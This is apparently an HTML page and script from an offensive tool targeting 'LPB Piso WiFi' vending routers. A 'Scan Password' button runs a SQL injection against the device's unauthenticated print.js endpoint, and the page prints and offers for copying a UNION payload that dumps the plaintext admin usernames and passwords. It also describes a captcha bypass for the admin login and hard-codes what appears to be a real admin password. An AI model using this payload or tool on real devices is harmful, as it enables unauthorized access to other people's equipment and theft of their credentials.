<div class="page" id="page-lpb-password">
    <div class="card card-full">
        <div class="card-title">
            LPB Piso WiFi Password
            <span class="badge badge-purple">10.0.0.1</span>
            <span class="badge badge-blue" id="lpbPassStatusBadge">Unknown</span>
        </div>

        <div style="display:grid;grid-template-columns:1fr 1fr;gap:20px;margin-bottom:20px">
            <div class="network-item" style="position:relative">
                <div class="label">Admin Username</div>
                <div class="value" id="lpbPassUser" data-raw="admin">admin</div>
            </div>
            <div class="network-item" style="position:relative">
                <div class="label">Admin Password</div>
                <div class="value masked" id="lpbAdminPass" data-raw="@Jurbox7319" data-visible="false">&#9679;&#9679;&#9679;&#9679;&#9679;&#9679;&#9679;&#9679;&#9679;&#9679;</div>
                <button class="toggle-pass" onclick="togglePassword('lpbAdminPass')" title="Show/Hide">&#128065;</button>
            </div>
        </div>

        <div style="background:#0f172a;border:1px solid #334155;border-radius:12px;padding:20px;margin-bottom:20px">
            <div style="font-size:15px;font-weight:600;color:#f1f5f9;margin-bottom:12px">&#128269; Scan Password</div>
            <div class="password-hint" style="margin-bottom:12px">Runs the <code>print.js</code> SQL injection live against the device and reveals the admin credentials. Only works while connected to the LPB WiFi network.</div>
            <button class="btn-scan" id="btnLpbScan" onclick="lpbScanPassword()" style="width:100%;justify-content:center">
                <span class="spinner"></span>
                <span class="btn-text">Scan Password</span>
            </button>
        </div>

        <div style="background:#0f172a;border:1px solid #334155;border-radius:12px;padding:20px;margin-bottom:20px">
            <div style="font-size:15px;font-weight:600;color:#f1f5f9;margin-bottom:12px">&#128273; Login</div>
            <div class="password-hint" style="margin-bottom:12px">Open the admin panel and sign in with the credentials above. Only reachable while connected to the LPB WiFi network.</div>
            <button class="btn-primary" onclick="window.open('http://10.0.0.1/admin', '_blank')" style="width:100%">Open Admin Panel</button>
        </div>

        <div style="background:#0f172a;border:1px solid #334155;border-radius:12px;padding:20px;margin-bottom:20px">
            <div style="font-size:15px;font-weight:600;color:#f1f5f9;margin-bottom:12px">&#128209; How it works</div>
            <div class="password-hint" style="margin-bottom:8px">
                The unauthenticated <code>print.js</code> endpoint at <code>/admin/index?action=print.js</code> concatenates the <code>hash</code> GET parameter unsanitized into <code>SELECT recno,vcode,minutes,amount FROM my_vouchers WHERE status='1' and hash='$hash'</code>. The scan button sends a UNION payload that dumps <code>my_users</code> instead.
            </div>
            <div class="wifi-scan-result" style="display:flex">
                <div class="wifi-info">
                    <div class="wifi-ssid">UNION dump of my_users</div>
                    <div class="wifi-pass">hash=zzz' UNION SELECT username,password,status,vouchergenerator FROM my_users -- </div>
                </div>
                <div class="wifi-actions">
                    <button onclick="copyToClipboard(&quot;hash=zzz' UNION SELECT username,password,status,vouchergenerator FROM my_users -- &quot;)" title="Copy payload">&#128203;</button>
                </div>
            </div>
            <div class="password-hint" style="margin-top:8px">Rows render through the Twig template <code>vouchertemplate.html.twig</code> (col1 = username, col2 = password). Password is stored in plaintext.</div>
        </div>

        <div style="display:grid;grid-template-columns:1fr 1fr;gap:20px">
            <div style="background:#0f172a;border:1px solid #334155;border-radius:12px;padding:20px">
                <div style="font-size:15px;font-weight:600;color:#f1f5f9;margin-bottom:12px">&#128203; Quick Copy</div>
                <div style="display:flex;gap:8px">
                    <button class="btn-primary" onclick="copyToClipboard(document.getElementById('lpbPassUser').dataset.raw)" style="flex:1">Copy Username</button>
                    <button class="btn-primary" onclick="copyToClipboard(document.getElementById('lpbAdminPass').dataset.raw)" style="flex:1">Copy Password</button>
                </div>
            </div>

            <div style="background:#0f172a;border:1px solid #334155;border-radius:12px;padding:20px">
                <div style="font-size:15px;font-weight:600;color:#f1f5f9;margin-bottom:12px">&#128160; Notes</div>
                <div class="password-hint">Login endpoint: <code>POST /admin/index?execute=1&amp;exec=login</code> with <code>username</code>, <code>password</code> and an empty <code>captcha</code> (the session captcha is null so empty passes).</div>
            </div>
        </div>
    </div>
</div>

<script>
    async function lpbScanPassword() {
        const btn = document.getElementById('btnLpbScan');
        const badge = document.getElementById('lpbPassStatusBadge');
        btn.classList.add('loading');
        btn.disabled = true;
        badge.textContent = 'Scanning';
        badge.className = 'badge badge-yellow';
        try {
            const res = await fetch('/api/lpb/scan-password');
            const data = await res.json();
            if (data.success && data.username && data.password) {
                const userEl = document.getElementById('lpbPassUser');
                const passEl = document.getElementById('lpbAdminPass');
                userEl.dataset.raw = data.username;
                userEl.textContent = data.username;
                userEl.dataset.visible = 'true';
                passEl.dataset.raw = data.password;
                passEl.textContent = '\u25CF'.repeat(Math.min(data.password.length, 12));
                passEl.dataset.visible = 'false';
                passEl.classList.add('masked');
                badge.textContent = 'Found';
                badge.className = 'badge badge-green';
                showToast('Admin credentials found!');
            } else {
                badge.textContent = 'Failed';
                badge.className = 'badge badge-red';
                showToast(data.message || 'Scan failed.', 'error');
            }
        } catch (err) {
            badge.textContent = 'Failed';
            badge.className = 'badge badge-red';
            showToast('Scan error: ' + err.message, 'error');
        } finally {
            btn.classList.remove('loading');
            btn.disabled = false;
        }
    }
</script>
